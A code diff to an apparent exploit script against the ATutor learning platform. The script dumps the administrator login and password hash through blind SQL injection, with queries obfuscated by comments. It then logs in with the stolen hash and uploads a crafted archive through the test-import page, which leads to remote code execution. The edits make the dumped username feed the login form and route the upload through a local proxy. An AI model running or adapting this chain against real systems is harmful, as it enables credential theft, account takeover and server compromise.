@@ -4,12 +4,11 @@ import hashlib
 import sys
 import string
 
-
 session = requests.Session()
 cookie = ""
 valid_char = string.printable
 sha1 = ""
-
+username = ""
 # to dump the username and password
 def sqliDump(query, label, ):
     print(f"[*] Trying to dump {label} ")
@@ -41,6 +40,7 @@ def sqliCheck():
     if "void" in response.text:
         print("[*] SQL Injection is possible ")
         sqliusername = 'select/**/login/**/from/**/AT_members'
+        global username
         username = sqliDump(sqliusername, "Username")
         if username:
             sqlipassword = f'select/**/password/**/from/**/AT_members/**/where/**/login="{username}"'
@@ -65,7 +65,7 @@ def login_with_hash():
         'form_course_id':'0',
         'form_password_hidden': password,
         'p':'',
-        'form_login':'test',
+        'form_login': username,
         'form_password':'',
         'submit':'Login',
         'token':token
@@ -102,8 +102,9 @@ def send_request():
     url = f"{sys.argv[1]}/mods/_standard/tests/import_test.php"
     with open("archive.zip", "rb") as file:
         upload_file = {"file": ('archive.zip', file, 'application/x-zip-compressed')}
+        proxies = {"http": "http://192.168.1.103:8082"}
         values = {"submit_import": "Import"}
-        response = session.post(url, data=values, files=upload_file, cookies=cookie)
+        response = session.post(url, data=values, files=upload_file, cookies=cookie, proxies=proxies)
         if response.text == "XML error: Not well-formed (invalid token) at line 1":
             print("[*] the file uploaded successfully")
             remote_code()
